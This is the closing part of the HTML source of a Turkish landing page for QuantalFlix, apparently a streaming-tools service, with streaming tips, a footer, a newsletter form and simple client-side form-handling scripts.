                    <div class="position-relative" style="height:220px;">
                        <img class="img-fluid w-100 h-100" src="assets/img/about-423.jpg" style="object-fit: cover;" alt="Büyük İzleyici Kitlesi">
                    </div>
                    <div class="bg-light text-center p-4">
                        <h3 class="mt-2">Büyük İzleyici Kitlesi</h3>
                        <span class="text-primary">Sınırsız Potansiyel</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    <div class="modal fade" id="registrationModal" tabindex="-1" aria-labelledby="registrationModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header border-bottom border-primary">
                    <h5 class="modal-title text-primary" id="registrationModalLabel">
                        <i class="fas fa-check-circle me-2"></i>Kayıt Başarılı
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Hesabınız başarıyla oluşturuldu! E-posta adresinize gönderilen aktivasyon linkine tıklayarak hesabınızı aktifleştirebilirsiniz.</p>
                </div>
                <div class="modal-footer border-top border-primary">
                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Tamam</button>
                </div>
            </div>
        </div>
    </div>

<div class="container-xxl py-5">
    <div class="container">
        <div class="text-center mx-auto mb-5 wow fadeInUp" data-wow-delay="0.1s" style="max-width: 600px;">
            <h4 class="section-title">Kısa Kılavuzlar</h4>
            <h1 class="display-6 mb-4">Başarılı Yayın İçin Pratik İpuçları</h1>
        </div>
        <div class="owl-carousel testimonial-carousel wow fadeInUp" data-wow-delay="0.1s">
            <div class="testimonial-item text-center" data-dot="<img class='img-fluid' src='assets/img/guide-connection.jpg' alt='Kılavuz'>">
              
                <p class="fs-5">Yayına başlamadan önce internet hızınızı test edin ve mümkünse ethernet kablosu kullanın. Kararlı bağlantı, kaliteli yayın için şart!</p>
                <span class="text-primary">Bağlantı İpucu</span>
            </div>
            <div class="testimonial-item text-center" data-dot="<img class='img-fluid' src='assets/img/guide-obs.jpg' alt='Kılavuz'>">
               
                <p class="fs-5">OBS sahnelerinizi önceden hazırlayın, hızlı geçiş tuşları ile profesyonel görünüm elde edin. Yayından önce test yapmayı unutmayın.</p>
                <span class="text-primary">OBS Ayarı</span>
            </div>
            <div class="testimonial-item text-center" data-dot="<img class='img-fluid' src='assets/img/guide-chat.jpg' alt='Kılavuz'>">
               
                <p class="fs-5">Chat entegrasyonlarını aktif edin, yayında izleyici etkileşimini artırmak için anlık mesajlara cevap verin. Moderasyon araçlarını kullanın.</p>
                <span class="text-primary">Chat Yönetimi</span>
            </div>
            <div class="testimonial-item text-center" data-dot="<img class='img-fluid' src='assets/img/guide-security.jpg' alt='Kılavuz'>">
          
                <p class="fs-5">Yayın anahtarınızı ve şifrelerinizi kimseyle paylaşmayın. Hesaplarınızı iki faktörlü doğrulama ile koruyun.</p>
                <span class="text-primary">Güvenlik</span>
            </div>
        </div>
    </div>
</div>
    <div class="container-fluid bg-light-dark text-body footer mt-5 pt-5 px-0 wow fadeIn" data-wow-delay="0.1s">
        <div class="container py-5">
            <div class="row g-5">
                <div class="col-lg-3 col-md-6">
                    <h3 class="text-light mb-4">Adres</h3>
                    <p class="mb-2"><i class="fa fa-map-marker-alt text-primary me-3"></i><a href="https://maps.app.goo.gl/tvEr3qmYmgrdPDzp8" target="_blank" style="color: #c6c7c8;">Şehit adem yörük evlilik parkı, Uzunoluk, 07800 Korkuteli/Antalya, Turkey</a></p>
                    <p class="mb-2"><i class="fa fa-phone-alt text-primary me-3"></i><a href="tel:+902426754567" style="color: #c6c7c8;">+90 242 675 4567</a></p>
                    <p class="mb-2"><i class="fa fa-envelope text-primary me-3"></i><a href="mailto:info@quantalflix.com" style="color: #c6c7c8;">info@quantalflix.com</a></p>
                    
                </div>
                <div class="col-lg-3 col-md-6">
                    <h3 class="text-light mb-4">Hizmetler</h3>
                    <a class="btn btn-link" href="obs-cloud.html">Bulut OBS</a>
                    <a class="btn btn-link" href="how-to-stream.html">Yayın Nasıl Yapılır</a>
                    <a class="btn btn-link" href="how-to-stream.html">Yayın Analitik</a>
                    <a class="btn btn-link" href="integrations.html">Chat Yönetimi</a>
                    <a class="btn btn-link" href="contact.html">Teknik Destek</a>
                </div>
                <div class="col-lg-3 col-md-6">
                    <h3 class="text-light mb-4">Hızlı Linkler</h3>
                    <a class="btn btn-link" href="/">Ana Sayfa</a>
                    <a class="btn btn-link" href="contact.html">İletişim</a>
                    <a class="btn btn-link" href="integrations.html">Entegrasyonlar</a>
                    <a class="btn btn-link" href="terms-of-service.html">Kullanım Şartları</a>
                    <a class="btn btn-link" href="privacy-policy.html">Gizlilik Politikası</a>
                </div>
                <div class="col-lg-3 col-md-6">
                    <h3 class="text-light mb-4">Bülten</h3>
                    <p>Yeni özellikler ve güncellemeler hakkında ilk siz haberdar olun.</p>
                    <div class="row justify-content-center">
                        <div class="col-12 position-relative">
                            <form id="signupForm" onsubmit="handleSignup(event)">
                                <input id="emailInput" class="form-control bg-transparent w-100 py-3 ps-4 pe-5" type="email" placeholder="E-posta adresinizi girin" style="color: #191c24;" required>
                                <button type="submit" class="btn btn-primary py-2 position-absolute top-0 end-0 mt-2 me-4">Kayıt Ol</button>
                            </form>
                        </div>
                    </div>
                    <div id="successMessage" class="alert alert-success mt-3 d-none" role="alert">
                        <h5>Kayıt başarılı!</h5>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid copyright">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
                        <p>&copy; 2025 QuantalFlix, Tüm Hakları Saklıdır.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>


    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <script src="assets/lib/wow/wow.min.js"></script>
    <script src="assets/lib/easing/easing.min.js"></script>
    <script src="assets/lib/waypoints/waypoints.min.js"></script>
    <script src="assets/lib/counterup/counterup.min.js"></script>
    <script src="assets/lib/owlcarousel/owl.carousel.min.js"></script>

    <script src="assets/js/master.js"></script>
    
    <script src="assets/js/cookie-banner.js"></script>

    <script>
        function getGclidFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('gclid') || '';
        }

        document.addEventListener('DOMContentLoaded', function() {
            const gclid = getGclidFromUrl();
            if (gclid) {
                document.getElementById('gclid_reg').value = gclid;
            }
        });

        function handleRegistration(event) {
            event.preventDefault();
            const form = document.getElementById('registrationForm');
            const name = document.getElementById('regName').value.trim();
            const email = document.getElementById('regEmail').value.trim();
            const gclid = document.getElementById('gclid_reg').value;

            form.classList.add('was-validated');

            if (form.checkValidity()) {

                const modal = new bootstrap.Modal(document.getElementById('registrationModal'));
                modal.show();
                form.reset();
                form.classList.remove('was-validated');
                
                document.getElementById('gclid_reg').value = gclid;
            }
        }
    </script>
    <script src="assets/js/validator.js"></script>
    <script>
        function handleSignup(event) {
            event.preventDefault(); 

            const email = document.getElementById('emailInput').value.trim();
            const messageBox = document.getElementById('successMessage');
            const form = document.getElementById('signupForm');

            if (email !== '') {
                messageBox.classList.remove('d-none');
                messageBox.classList.remove('alert-danger');
                messageBox.classList.add('alert-success');
                messageBox.innerHTML = '<h5>✅ Kayıt başarılı!</h5><p>E-posta adresiniz bülten listemize eklendi.</p>';
                
                form.reset();
                
                setTimeout(() => {
                    messageBox.classList.add('d-none');
                }, 3000);
            } else {
                messageBox.classList.remove('d-none');
                messageBox.classList.remove('alert-success');
                messageBox.classList.add('alert-danger');
                messageBox.innerHTML = '<h5>⚠️ Hata!</h5><p>Lütfen geçerli bir e-posta adresi girin.</p>';
                
                setTimeout(() => {
                    messageBox.classList.add('d-none');
                }, 3000);
            }
        }
      
        function handleSignup(event) {
            event.preventDefault(); 

            const email = document.getElementById('emailInput').value.trim();
            const messageBox = document.getElementById('successMessage');
            const form = document.getElementById('signupForm');

            if (email !== '') {
                messageBox.classList.remove('d-none');
                messageBox.classList.remove('alert-danger');
                messageBox.classList.add('alert-success');
                messageBox.innerHTML = '<h5>✅ Kayıt başarılı!</h5><p>E-posta adresiniz bülten listemize eklendi.</p>';
                
                form.reset();
                
                setTimeout(() => {
                    messageBox.classList.add('d-none');
                }, 3000);
            } else {
                messageBox.classList.remove('d-none');
                messageBox.classList.remove('alert-success');
                messageBox.classList.add('alert-danger');
                messageBox.innerHTML = '<h5>⚠️ Hata!</h5><p>Lütfen geçerli bir e-posta adresi girin.</p>';
                
                setTimeout(() => {
                    messageBox.classList.add('d-none');
                }, 3000);
            }
        }
   
    </script>
</body>

</html>